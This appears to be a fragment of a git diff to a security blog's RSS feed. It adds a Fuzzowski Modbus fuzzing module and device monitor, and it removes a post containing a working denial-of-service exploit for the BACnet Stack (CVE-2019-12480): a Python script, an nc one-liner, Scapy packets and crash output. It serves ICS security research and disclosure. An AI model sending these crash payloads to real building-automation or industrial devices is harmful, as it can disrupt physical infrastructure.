+    python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 0.5 -r read_coil
+    python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus 
+    python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 1 -m modbusMon
+    &quot;&quot;&quot;
+
+    # --------------------------------------------------------------- #
+
+    name = 'modbus'
+
+    @staticmethod
+    def get_requests() -&amp;gt; List[callable]:
+        return [MODBUS.read_coil, MODBUS.read_input, MODBUS.read_holding, MODBUS.read_discrete, MODBUS.single_coil, MODBUS.single_register, MODBUS.multiple_coil, MODBUS.multiple_register, MODBUS.other_operations]
+
+    # --------------------------------------------------------------- #
+
+    @staticmethod
+    def define_nodes(*args, **kwargs) -&amp;gt; None:
+        
+        # ------------------ Read Coil Status (FC=01) ------------------- #
+
+        s_initialize(&quot;modbus_read_coil&quot;)
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0000,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('pdu'):
+                s_byte(0x01,name='funcCode read coil memory',fuzzable=False)
+                s_word(0x0000,name='start address')
+                s_word(0x0000,name='quantity')
+        
+
+        s_initialize('read_holding_registers')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('read_holding_registers_block'):
+                s_byte(0x01,name='read_holding_registers')
+                s_word(0x0000,name='start address')
+                s_word(0x0000,name='quantity')
+        # --------------------------------------------------------------- #
+
+
+        # ------------------ Read Input Status (FC=02) ------------------ #
+        s_initialize('ReadDiscreteInputs')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadDiscreteInputsRequest'):
+                s_byte(0x02,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='start_address')
+                s_word(0x0000,name='quantity')
+        # --------------------------------------------------------------- #
+
+        # ---------------- Read Holding Registers (FC=03) --------------- #
+        s_initialize('ReadHoldingRegisters')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadHoldingRegistersRequest'):
+                s_byte(0x03,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='start_address')
+                s_word(0x0000,name='quantity')
+        # --------------------------------------------------------------- #
+
+        # ---------------- Read Input Registers (FC=04) ----------------- #
+        s_initialize('ReadInputRegisters')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadInputRegistersRequest'):
+                s_byte(0x04,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='start_address')
+                s_word(0x0000,name='quantity')
+        # --------------------------------------------------------------- #
+
+
+        # ------------------ Force Single Coil (FC=05) ------------------ #
+        s_initialize('WriteSingleCoil')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('WriteSingleCoilRequest'):
+                s_byte(0x05,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='start_address')
+                s_word(0x0000,name='quantity')
+        # --------------------------------------------------------------- #
+
+        # ---------------- Preset Single Register (FC=06) --------------- #
+
+        s_initialize('WriteSingleRegister')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('WriteSingleRegisterRequest'):
+                s_byte(0x06,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='output_address')
+                s_word(0x0000,name='output_value')
+        # --------------------------------------------------------------- #
+
+        # ---------------- Force Multiple Coils (FC=15) ----------------- #
+        s_initialize('WriteMultipleCoils')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('WriteMultipleCoilsRequest'):
+                s_byte(0x0f,name='func_code',fuzzable=False)
+                s_word(0x0000,name='starting_address')
+                s_dword(0x0000,name='byte_count')
+                s_size(&quot;outputsValue&quot;, length=8)
+                with s_block(&quot;outputs&quot;):
+                    s_word(0x00,name='outputsValue')
+        # --------------------------------------------------------------- #
+
+        # --------------- Preset Multiple Registers (FC=16) ------------- #
+        s_initialize('WriteMultipleRegisters')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('WriteMultipleRegistersRequest'):
+                s_byte(0x10,name='func_code',fuzzable=False)
+                s_word(0x0000,name='starting_address')
+                s_dword(0x0000,name='byte_count')
+                s_size(&quot;outputsValue&quot;,length=16)
+                s_size(&quot;outputsValue2&quot;, length=8)
+                with s_block(&quot;outputs&quot;):
+                    s_dword(0x0000,name='outputsValue3')
+        # --------------------------------------------------------------- #
+
+
+        # ---------------------------- Other ---------------------------- #
+        s_initialize('ReadExceptionStatus')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadExceptionStatusRequest'):
+                s_byte(0x07,name='funcCode',fuzzable=False)
+    
+
+        s_initialize('ReadExceptionStatusError')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadExceptionStatusErrorRequest'):
+                s_byte(0x87,name='funcCode',fuzzable=False)
+
+        s_initialize('ReportSlaveId')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReportSlaveIdRequest'):
+                s_byte(0x11,name='func_code',fuzzable=False)
+
+        s_initialize('ReadFileSub')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadFileSubRequest'):
+                s_byte(0x06,name='refType',fuzzable=False)
+                s_word(0x0001,name='fileNumber')
+                s_word(0x0000,name='recordNumber')
+                s_word(0x0000,name='recordLength')
+
+        s_initialize('ReadFileRecord')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadFileRecordRequest'):
+                s_byte(0x14,name='funcCode',fuzzable=False)
+                s_byte(0x0001,name='byteCount')
+
+        s_initialize('WriteFileSub')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('WriteFileSubRequest'):
+                s_byte(0x06,name='refType',fuzzable=False)
+                s_word(0x0001,name='fileNumber')
+                s_word(0x0000,name='recordNumber')
+                # ---------------------------------
+                # s_size is record
+                s_size('recordData',length=16,name='recordLength')
+                with s_block(&quot;recordData&quot;):
+                    s_word(0x0000,name='recordData_value')
+                s_word(0x0000,name='recordLength_value')
+
+        s_initialize('WriteFileRecord')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('WriteFileRecordRequest'):
+                s_byte(0x15,name='funcCode',fuzzable=False)
+                s_byte(0x00,name='datalength')
+
+        s_initialize('MaskWriteRegister')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('MaskWriteRegisterRequest'):
+                s_byte(0x96,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='refAddr')
+                s_word(0xffff,name='andMask')
+                s_word(0x0000,name='orMask')
+
+        s_initialize('ReadWriteMultipleRegisters')
+        with s_block(&quot;modbus_head&quot;):
+            s_word(0x0001,name='transId',fuzzable=True)
+            s_word(0x0002,name='protoId',fuzzable=False)
+            s_word(0x06,name='length')
+            s_byte(0xff,name='unit Identifier',fuzzable=False)
+            with s_block('ReadWriteMultipleRegistersRequest'):
+                s_byte(0x17,name='funcCode',fuzzable=False)
+                s_word(0x0000,name='readStartingAddr')
+                s_word(0x0001,name='readQuantityRegisters')
+                s_word(0x0000,name='writeStartingAddr')
+                s_size('writeQuantityRegisters',length=16,endian='&amp;gt;',name=&quot;writeQuantityRegisters&quot;)
+                s_size('writeQuantityRegisters', length=8, endian='&amp;gt;',name=&quot;byteCount&quot;,math=lambda x:2*x)
+                with s_block('writeQuantityRegisters_block'):
+                    s_size('modbus_head',length=2)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Atomic Write File service payload:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -ne '\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f' | nc -u 192.168.10.10 47808
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The monitor piece define a way to send a query for MODBUS device id to the target and check the response.&lt;/p&gt;
 
-&lt;h2 id=&quot;python&quot;&gt;Python&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# --------------------------------------------------------------- #
+SlaveID = 1 # Modbus TCP Unit Identifier: 1..247
+# --------------------------------------------------------------- #
 
-&lt;p&gt;Using the output generated by the fuzzer and gdb could be possible to generate some POC exploits:&lt;/p&gt;
+# ----------------- Device ID to bytes -------------------------- #
+def bitDeviceID(DeviceID):
+    bytes_id = (DeviceID).to_bytes((DeviceID.bit_length() + 7) // 8, byteorder='big')
+    return bytes_id
 
-&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/p&gt;
+HexSlaveID = bitDeviceID(SlaveID)
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Exploit Title: BACnet Stack 0.8.6 - Denial of Service
-# Exploit Author: mmorillo
-# Vendor Homepage: https://sourceforge.net/p/bacnet/
-# Software Link: https://sourceforge.net/projects/bacnet/files/bacnet-stack/bacnet-stack-0.8.6/
-# Version: bacnet-stack-0.8.6
-# Tested on: Linux
-# CVE: CVE-2019-12480
+class modbusMonitor(IMonitor):
+    &quot;&quot;&quot;
+    MODBUS Monitor Module interface
+    @Author: https://github.com/1modm
+    &quot;&quot;&quot;
 
-#!/usr/bin/env python
-# 
-# After reported the bug to the vendor, sharing details
-# about the vulnerability, as well as proof-of-concept code (exploit code to 
-# test), has been release a fix for 0.8.7 release of 
-# BACnet Protocol Stack https://sourceforge.net/p/bacnet/
+    # Based on https://svn.nmap.org/nmap/scripts/modbus-discover.nse
+    # Send Read Device Identification 
+    get_modbus_device_id_nse = (b&quot;\x00\x00&quot;  # Modbus TCP Transaction Identifier
+                               b&quot;\x00\x00&quot;  # Modbus TCP Protocol Identifier
+                               b&quot;\x00\x05&quot;  # Modbus TCP Length
+                               # Modbus TCP Unit Identifier
+                               + HexSlaveID +
+                               # Discover device ID
+                               b&quot;\x2b&quot;  # Modbus Function Code: Encapsulated Interface Transport
+                               b&quot;\x0e&quot;  # Modbus MEI type: Read Device Identification
+                               b&quot;\x01&quot;  # Modbus Read Device ID: Basic Device Identification
+                               b&quot;\x00&quot;  # Modbus Object ID: VendorName
+                               )
 
-import socket
-import struct
-import argparse
-import os
-import sys
-from termcolor import colored
+    # Send Report Slave ID request
+    get_modbus_slave_id = (b&quot;\x00\x00&quot;  # Modbus TCP Transaction Identifier
+                           b&quot;\x00\x00&quot;  # Modbus TCP Protocol Identifier
+                           b&quot;\x00\x02&quot;  # Modbus TCP Length
+                           # Modbus TCP Unit Identifier
+                           + HexSlaveID +  
+                           b&quot;\x11&quot;  # Report Slave ID
+                           #b&quot;\x04&quot;, # Send read input register instead previous?
+                           )
 
-#------------------------------------------------------------------------------
-# Command line parser using argparse
-#------------------------------------------------------------------------------
+    @staticmethod
+    def name() -&amp;gt; str:
+        return &quot;modbusMon&quot;
 
-def cmdline_parser():
-    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True,
-             description='BACnet Protocol Stack Segmentation fault leading to denial of service', version='0.1',
-             usage=&quot;python %(prog)s&quot;)
+    @staticmethod
+    def help():
+        return &quot;Sends a query for MODBUS device id to the target and check the response&quot;
 
-    # Mandatory
-    parser.add_argument('Server', type=str, help='BACnet server IP')
-    parser.add_argument('Port', type=str, help='BACnet port')
-
-    return parser
-
-
-def get_Host_name_IP(): 
-    try: 
-        host_name = socket.gethostname() 
-        host_ip = socket.gethostbyname(host_name) 
-        return host_ip
-    except: 
-        print(&quot;Unable to get Hostname and IP&quot;) 
-
-
-def target_alive(BACnetServer, BACnetPort):
-    response = os.system(&quot;nc -u -z -w 1 &quot; + BACnetServer + &quot; &quot; + str(BACnetPort))
-
-    if response == 0:
-        return True
-    else:
-        return False
-
-#------------------------------------------------------------------------------
-# Main of program
-#------------------------------------------------------------------------------
-
-def main():
-
-    # Get the command line parser.
-    parser = cmdline_parser()
-
-    # Show help if no args
-    if len(sys.argv) == 1:
-        parser.print_help()
-        sys.exit(1)
-
-    # Get results line parser.
-    results = parser.parse_args()
-
-    BACnetServer = results.Server
-    BACnetPort = int(results.Port)
-    SRC_IP = get_Host_name_IP()
-
-    if not target_alive(BACnetServer, BACnetPort):
-        print((colored(&quot;[+] BACnet server down&quot;, &quot;yellow&quot;)))
-
-    else:
-        if target_alive(BACnetServer, BACnetPort):
-
-            payload_DeviceCommunicationControl = &quot;\x81\x0a\x00\x16\x01\x04\x00\x05\x01\x11\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41&quot;
-
-            print((colored(&quot;[+] Sending BACnet DeviceCommunicationControl payload from &quot; + SRC_IP, &quot;green&quot;)))
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
-            s.connect((BACnetServer, BACnetPort))
-            s.send(struct.pack('&amp;gt;I',len(payload_DeviceCommunicationControl)))
-            s.send(payload_DeviceCommunicationControl)
-
-            print((colored(&quot;[+] Sent Payload: &quot; + payload_DeviceCommunicationControl.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), &quot;yellow&quot;)))
-
-        if target_alive(BACnetServer, BACnetPort):
-
-            payload_AtomicReadFile = &quot;\x81\x0a\x00\x1b\x01\x14\x00\x05\x01\x06\xc4\x02\x80\x00\x00\x0e\x35\xff\xdf\x62\xee\x00\x00\x22\x05\x84\x0f&quot;
-
-            print((colored(&quot;[+] Sending BACnet AtomicReadFile payload from &quot; + SRC_IP, &quot;green&quot;)))
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
-            s.connect((BACnetServer, BACnetPort))
-            s.send(struct.pack('&amp;gt;I',len(payload_AtomicReadFile)))
-            s.send(payload_AtomicReadFile)
-
-            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicReadFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), &quot;yellow&quot;)))
-
-        if target_alive(BACnetServer, BACnetPort):
-
-            payload_AtomicWriteFile = &quot;\x81\x0a\x00\x1b\x01\x04\x00\x05\x02\x07\xc4\x02\x80\x00\x00\x0e\x35\xff\x5e\xd5\xc0\x85\x0a\x62\x64\x0a\x0f&quot;
-
-            print((colored(&quot;[+] Sending BACnet AtomicWriteFile payload from &quot; + SRC_IP, &quot;green&quot;)))
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
-            s.connect((BACnetServer, BACnetPort))
-            s.send(struct.pack('&amp;gt;I',len(payload_AtomicWriteFile)))
-            s.send(payload_AtomicWriteFile)
-
-            print((colored(&quot;[+] Sent Payload: &quot; + payload_AtomicWriteFile.encode('hex') + ' to BACnet server ' + BACnetServer + ' port ' + str(BACnetPort), &quot;yellow&quot;)))
-
-        if not target_alive(BACnetServer, BACnetPort):
-            print((colored(&quot;[+] DoS completed&quot;, &quot;red&quot;)))
+    def test(self):
+        conn = self.get_connection_copy()
+        result = self._get_modbus_info(conn)
+        return result
 
 
-#------------------------------------------------------------------------------
-# Main
-#------------------------------------------------------------------------------
+    def _get_modbus_info(self, conn: ITargetConnection):
+        try:
+            conn.open()
+            conn.send(self.get_modbus_device_id_nse) # or get_modbus_slave_id
+            data = conn.recv_all(10000)
+            if len(data) == 0:
+                self.logger.log_error(&quot;MODBUS error response, getting MODBUS device information Failed!!&quot;)
+                result = False
+            else:
+                Unit_ID = data[6].to_bytes((data[6].bit_length() + 7) // 8, byteorder='big')
+                Func_code = data[7]
+                Exception_code = data[8]
 
-if __name__ == '__main__':
-    main()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+                if data[5] &amp;gt; 0 and Unit_ID == HexSlaveID:
+                    if hex(Func_code) == '0x11':
+                      self.logger.log_info(f&quot;Getting MODBUS device information succeeded&quot;)
+                    elif hex(Exception_code) == '0xb': # more details needed? and (hex(Func_code) == '0x91' or hex(Func_code) == '0x84')
+                      self.logger.log_warn(f&quot;Getting MODBUS device information: Gateway target device failed to respond&quot;)
+                    elif hex(Exception_code) == '0x1':
+                      self.logger.log_warn(f&quot;Getting MODBUS device information: Illegal function&quot;)
+                    else:
+                      self.logger.log_warn(f&quot;Getting MODBUS device information warning&quot;)
+                else:
+                  self.logger.log_warn(f&quot;Getting MODBUS data error&quot;)
 
-&lt;h2 id=&quot;scapy&quot;&gt;Scapy&lt;/h2&gt;
+                result = True
+        except Exception as e:
+            self.logger.log_error(f&quot;MODBUS response error, getting MODBUS device information Failed!! Exception while receiving: {type(e).__name__}. {str(e)}&quot;)
+            result = False
+        finally:
+            conn.close()
 
-&lt;p&gt;Using the partially implemented &lt;a href=&quot;https://github.com/desolat/scapy-bacnet&quot;&gt;BACnet layer for Scapy&lt;/a&gt; can be generated the BLVC, NPDU and APDU layers in order to send the specific exploit octets. For example:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python
-Python 2.7.16 (default, Apr  1 2019, 14:50:41)
-[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.3)] on darwin
-Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
-&amp;gt;&amp;gt;&amp;gt; from bacnet import BvlcFunction, BVLC, BACNET_PORT, NPDU, NetworkLayerMessageType, hexStringToIntList, APDU, PduType, UnconfirmedServiceChoice
-&amp;gt;&amp;gt;&amp;gt; from scapy.layers.inet import IP, UDP
-&amp;gt;&amp;gt;&amp;gt; from scapy.all import *
-&amp;gt;&amp;gt;&amp;gt; DST_IP = '192.168.10.10'
-&amp;gt;&amp;gt;&amp;gt; SRC_PORT = 63491
-&amp;gt;&amp;gt;&amp;gt; BACNET_PORT = 47808
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; udp = IP(dst=DST_IP) / UDP(sport=SRC_PORT, dport=BACNET_PORT)
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; bvlc = udp / BVLC(function=BvlcFunction.ORIGINAL_UNICAST_NPDU)
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; npdu = bvlc / NPDU(nlpci=0b00000100)
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; apdu = npdu / APDU(pdu_type=PduType.CONFIRMED_REQUEST,service_choice=UnconfirmedServiceChoice.DEVICECOMMUNICATIONCONTROL)  / Raw(&quot;\x0d\xff\x80\x00\x03\x1a\x0a\x19\x00\x2a\x00\x41&quot;)
-&amp;gt;&amp;gt;&amp;gt;
-&amp;gt;&amp;gt;&amp;gt; apdu.display()
-
-###[ IP ]###
-  version   = 4
-  ihl       = None
-  tos       = 0x0
-  len       = None
-  id        = 1
-  flags     =
-  frag      = 0
-  ttl       = 64
-  proto     = udp
-  chksum    = None
-  src       = 192.168.10.5
-  dst       = 192.168.10.10
-  \options   \
-###[ UDP ]###
-     sport     = 63491
-     dport     = bacnet
-     len       = None
-     chksum    = None
-###[ BVLC ]###
-        type      = 0x81
-        function  = ORIGINAL_UNICAST_NPDU
-        length    = None
-###[ NPDU ]###
-           version   = 1
-           nlpci     = 4
-###[ APDU ]###
-              pdu_type  = CONFIRMED_REQUEST
-              reserved  = 0
-              max_response_segments= 0x5
-              invoke_id = 0x1
-              service_choice= DEVICECOMMUNICATIONCONTROL
-###[ Raw ]###
-                 load      = '\r\xff\x80\x00\x03\x1a\n\x19\x00*\x00A'
-
-&amp;gt;&amp;gt;&amp;gt; send(apdu)
-.
-Sent 1 packets.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;segmentation-fault&quot;&gt;Segmentation Fault&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./bacserv
-BACnet Server Demo
-BACnet Stack Version 0.8.6
-BACnet Device ID: 260001
-Max APDU: 1476
-DeviceCommunicationControl!
-Violación de segmento (`core' generado)
+        return result
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
 
 &lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.incibe.es/extfrontinteco/img/File/intecocert/ManualesGuias/incibe_protocol_net_security_ics.pdf&quot;&gt;Protocols and network security in ICS infrastructures&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.blackhat.com/docs/us-17/wednesday/us-17-Brandstetter-insecurity-In-Building-Automation-How-To-Create-Dark-Buildings-With-Light-Speed.pdf&quot;&gt;(in)security in building automation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/nccgroup/fuzzowski&quot;&gt;Fuzzowski&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/OpenRCE/sulley&quot;&gt;Sulley&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/jtpereyda/boofuzz&quot;&gt;BooFuzz&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf&quot;&gt;135_2004&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Main_Page&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/&quot;&gt;The Free or Open Source Software BACnet Stack&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/projects/bacnet/&quot;&gt;BACnet Protocol Stack&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-12480&quot;&gt;NVD CVE-2019-12480 Details&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/61/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/61/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/62/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/62/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47148&quot;&gt;https://www.exploit-db.com/exploits/47148&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&quot;&gt;http://packetstormsecurity.com/files/153716/BACnet-Stack-0.8.6-Denial-Of-Service.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3220&quot;&gt;https://sourceforge.net/p/bacnet/code/3220&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3223&quot;&gt;https://sourceforge.net/p/bacnet/code/3223&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3224&quot;&gt;https://sourceforge.net/p/bacnet/code/3224&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/code/3225&quot;&gt;https://sourceforge.net/p/bacnet/code/3225&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.ashrae.org/technical-resources/bookstore/bacnet&quot;&gt;BACnet ashrae&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.rhyshaden.com/bacnet.htm&quot;&gt;BACnet rhyshaden resources&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
+
 </description>
-        <pubDate>Sun, 17 Nov 2019 00:00:00 +0000</pubDate>
+        <pubDate>Tue, 14 Jul 2020 00:00:00 +0100</pubDate>
         <link>https://1modm.github.io/Fuzzing_ICS_protocols.html</link>
         <guid isPermaLink="true">https://1modm.github.io/Fuzzing_ICS_protocols.html</guid>
         
@@ -804,7 +1072,7 @@ Violación de segmento (`core' generado)
   &lt;li&gt;A BACNet port open UDP 47808&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get install -y build-essential
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get install -y build-essential
 $ sudo apt-get install subversion
 $ svn checkout svn://svn.code.sf.net/p/bacnet/code/trunk/bacnet-stack bacnetServer
 $ cd bacnetServer
@@ -872,7 +1140,7 @@ $ demo/server/bacserv
 
 &lt;p&gt;Stack and GDB output for segmentation fault in the Device Communication Control service:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Linux 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64
 Signal si_signo: 11 Signal si_addr: 2154041910
 Nearby code:
    0x000000000041374e &amp;lt;+19&amp;gt;:    mov    rdx,rbx
@@ -963,7 +1231,7 @@ No symbol table info available.
 
 &lt;p&gt;Stack and GDB output for segmentation fault in the Atomic Read File service:&lt;/p&gt;
 
